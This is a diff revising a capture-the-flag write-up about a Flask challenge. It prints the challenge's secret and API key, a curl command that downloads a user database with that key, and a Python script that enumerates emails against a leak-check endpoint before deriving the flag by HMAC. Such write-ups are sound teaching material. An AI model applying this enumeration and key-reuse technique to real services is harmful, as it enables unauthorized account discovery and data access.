@@ -24,24 +24,22 @@ Read_time: "8 min read"<br>
 
 ## Introduction
 
-This challenge revolves around identifying a hidden administrative identity and leveraging a cryptographic mechanism to derive the flag. The backend relies on HMAC-SHA256 to determine administrative privileges. However, an auxiliary API unintentionally leaks identifying metadata. The objective is to correlate this leak with the cryptographic logic to recover the flag.
+This challenge revolves around identifying a hidden administrative identity and leveraging a cryptographic mechanism to derive the flag. The backend relies on HMAC-SHA256 to determine administrative privileges. An auxiliary API unintentionally leaks identifying metadata, enabling enumeration of the admin account.
 
 ## 1. Reconnaissance
 
-Initial review of the provided artifacts revealed:
+Artifacts provided:
 
 - Flask web application
 - Docker environment
-- `.env` file containing cryptographic secrets and API keys
-
-The `.env` file exposed:
+- `.env` file
 
 ```
 FLAG_SECRET = 3HZ0jv5EuC4WHoJnxGKDxuoD9mCkxHMlJz3MucS6U40k7lLdqDqlF2pmeDRT2W5F
 ADMIN_API_KEY = 6208d4e88be3d7a2c6845189a23954420f037a262d13a833b9ace3ef98a35ee0
 ```
 
-The core validation condition:
+Core validation condition:
 
 ```
 HMAC_SHA256(FLAG_SECRET, email) == FLAG_TOKEN
@@ -49,19 +47,20 @@ HMAC_SHA256(FLAG_SECRET, email) == FLAG_TOKEN
 
 ### Passive Reconnaissance
 
-- Reviewed Flask source code
-- Inspected `.env` configuration
-- Analyzed route definitions and authentication logic
+- Reviewed Flask routes
+- Inspected environment variables
+- Analyzed token generation logic
 
 ### Active Reconnaissance
 
-Identified external service endpoint:
+Leak-check endpoint:
 
 ```
 https://tlctf2025-hibc.chals.io/check_email?email=<email>
 ```
+<img width="1214" height="274" alt="image" src="https://github.com/user-attachments/assets/9c199a67-3779-4692-8cd2-2b07a0a59c01" />
 
-Database download endpoint:
+Database download:
 
 ```bash
 curl -s -H "X-API-Key: 6208d4e88be3d7a2c6845189a23954420f037a262d13a833b9ace3ef98a35ee0" https://tlctf2025-data-app.chals.io/download_db -o runtime_db.csv
@@ -71,9 +70,7 @@ curl -s -H "X-API-Key: 6208d4e88be3d7a2c6845189a23954420f037a262d13a833b9ace3ef9
 
 ## 2. Scanning and Enumeration
 
-The downloaded CSV contained multiple user emails. Each email was tested against `/check_email`.
-
-Typical response:
+Typical response from `/check_email`:
 
 ```json
 {
@@ -93,16 +90,12 @@ The admin email would produce an anomalous response.
 
 ### Vulnerability Analysis
 
-The vulnerability was not cryptographic weakness but metadata leakage:
-
-- The admin identity was not stored.
-- It was derived using HMAC comparison.
-- The auxiliary API leaked which email was “pwned.”
-- The only pwned email corresponded to the admin.
+- HMAC logic was secure.
+- Admin identity derived via HMAC comparison.
+- Auxiliary endpoint leaked `pwned` metadata.
+- Only one email returned `pwned: true`.
 
 ### Exploitation Steps
-
-Automated enumeration:
 
 ```python
 import csv, requests
@@ -133,17 +126,17 @@ ADMIN FOUND: blake.baker20@acme.test
 {"email": "blake.baker20@acme.test", "plaintext_password": null, "pwned": true}
 ```
 
+<img width="1214" height="274" alt="image" src="https://github.com/user-attachments/assets/f5bc8cf6-e182-4f24-8131-5324eeaf99cd" />
+
 ---
 
 ## 4. Privilege Escalation
 
-Not applicable. Administrative status was determined via HMAC comparison rather than stored roles. Identifying the correct email was sufficient.
+Not applicable. Identification of the correct email was sufficient.
 
 ---
 
 ## 5. Post-Exploitation & Loot
-
-Using the discovered admin email:
 
 ```python
 import hmac, hashlib
@@ -156,13 +149,11 @@ token  = hmac.new(SECRET.encode(), email.encode(), hashlib.sha256).hexdigest()
 print("FLAG: trustctf{" + token[:12] + "}")
 ```
 
-The correct flag was derived from the first 12 characters of the HMAC digest.
-
 ---
 
 ## Conclusion
 
-The cryptographic implementation itself was correct. The failure occurred due to information leakage via an auxiliary endpoint. Secure systems must consider side channels and metadata exposure, not just algorithmic correctness.
+The weakness was not in cryptography but in metadata exposure through an auxiliary endpoint. Security failures often emerge from integration boundaries rather than core primitives.
 
 > "Security fails at the boundaries, not the primitives." — scap3sh4rk
 
